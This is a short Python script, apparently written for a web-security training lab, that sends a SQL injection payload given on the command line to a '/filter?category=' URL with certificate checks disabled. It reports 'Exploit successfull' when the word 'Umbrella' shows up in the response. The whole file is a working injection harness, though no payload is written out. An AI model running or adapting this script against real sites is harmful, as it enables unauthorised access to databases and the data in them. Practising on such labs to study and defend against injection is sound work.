import sys
import requests
import urllib3
urllib3.disable_warnings()
def exploit_sqli(url,payload):
    path='/filter?category='
    f_path=url+path+payload
    r=requests.get(f_path,verify=False)
    if "Umbrella" in r.text:
        return True
    else:
        return False



try:
    url=sys.argv[1].strip()    
    payload=sys.argv[2].strip()   
    if exploit_sqli(url,payload):
        print("[+] Exploit successfull")
    else:
        print("[-] Injection unsuccessfull")                                                                          
except IndexError:
    print(f"[+] Syntax: python3 -m {sys.argv[0].strip()} <url> <payload>")
    exit(-1)


